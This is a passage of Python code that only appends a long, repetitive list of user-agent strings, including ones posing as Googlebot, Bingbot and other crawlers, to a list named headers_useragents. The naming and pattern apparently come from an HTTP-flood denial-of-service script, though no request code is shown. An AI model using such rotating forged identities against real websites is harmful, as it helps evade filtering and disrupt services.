        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html)"
        " Gecko/2008032620"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot"
        " www.idealobserver.com"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; Arachmo)")
    headers_useragents.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible;"
        " +http://www.become.com/site_owners.html)"
    )
    headers_useragents.append("BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    )
    headers_useragents.append(
        "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML,"
        " like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser"
        " 1.98.744; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo"
        " Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;"
        " Avant Browser)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser;"
        " GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1;"
        " .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like"
        " Gecko, Safari/419.3) Cheshire/1.0.ALPHA"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like"
        " Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML,"
        " like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
    )
    headers_useragents.append(
        "Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML,"
        " like Gecko) Version/7.0.3 Safari/7046A194A"
    )
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 3.55)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 2.00)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)"
    )
    headers_useragents.append("SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)")
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (FM Scene 4.6.1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) "
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004"
        " Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none;"
        " freenet DSL 1.1; (none))"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie;"
        " .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like"
        " Gecko) Safari/417.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010"
        " Firefox/1.0.7 (Ubuntu package 1.0.7)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR"
        " 2.0.50727; .NET CLR 3.0.04506.30)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Googlebot/2.1 (http://www.googlebot.com/bot.html)")
    headers_useragents.append("Opera/9.20 (Windows NT 6.0; U; en)")
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205"
        " Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR"
        " 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)"
    )
    headers_useragents.append("Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML,"
        " like Gecko) Version/4.0 Safari/528.16"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209"
        " Firefox/3.6.13"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)")
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401"
        " Firefox/4.0 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo"
        " Firefox/3.6.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809"
        " Fedora/3.6.7-1.fc14 Firefox/3.6.7"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc"
        " dot com ; http://help.yahoo.com/help/us/shop/merchant/)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
